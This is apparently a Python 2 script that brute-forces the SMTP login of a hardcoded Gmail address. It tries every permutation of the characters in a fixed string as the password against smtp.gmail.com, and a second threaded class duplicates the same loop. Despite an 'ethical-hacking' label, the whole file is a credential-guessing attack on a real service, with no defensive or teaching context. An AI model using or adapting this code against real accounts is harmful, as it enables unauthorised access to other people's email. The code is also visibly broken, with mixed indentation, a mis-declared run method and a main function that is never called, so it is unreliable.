import smtplib
import thread
import time

def permutation(lst):
 
    if len(lst) == 0:
        return []
 
    if len(lst) == 1:
        return [lst]
    l = [] 
 
    for i in range(len(lst)):
       m = lst[i]
 
       remLst = lst[:i] + lst[i+1:]
 
       for p in permutation(remLst):
           l.append([m] + p)
    return l

def main():
	fromaddr = 'hellobheri@gmail.com'
	toaddrs  = 'hellobheri@gmail.com'

	msg = 'ethical-hacking'

	username = 'hellobheri@gmail.com'

	data = list('irs1919@')
	for p in permutation(data):
		password= "".join(str(x) for x in p)
		print password
		server = smtplib.SMTP('smtp.gmail.com:587')
		server.starttls()
		if(server.login(username,password)):
			print password
			server.quit()



import threading
import time

exitFlag = 0

class myThread (threading.Thread):
   def __init__(self, threadID, name, counter):
      threading.Thread.__init__(self)
      self.threadID = threadID
      self.name = name
      self.counter = counter
   def run(self,password):
      fromaddr = 'hellobheri@gmail.com'
	toaddrs  = 'hellobheri@gmail.com'

	msg = 'ethical-hacking'

	username = 'hellobheri@gmail.com'

	data = list('irs1919@')
	for p in permutation(data):
		password= "".join(str(x) for x in p)
		print password
		server = smtplib.SMTP('smtp.gmail.com:587')
		server.starttls()
		if(server.login(username,password)):
			print password
			server.quit()


def print_time(threadName, counter, delay):
   while counter:
      if exitFlag:
         threadName.exit()
      time.sleep(delay)
      print "%s: %s" % (threadName, time.ctime(time.time()))
      counter -= 1

# Create new threads
thread1 = myThread(1, "Thread-1", 1)
thread2 = myThread(2, "Thread-2", 2)

# Start new Threads
thread1.start()
thread2.start()

print "Exiting Main Thread"
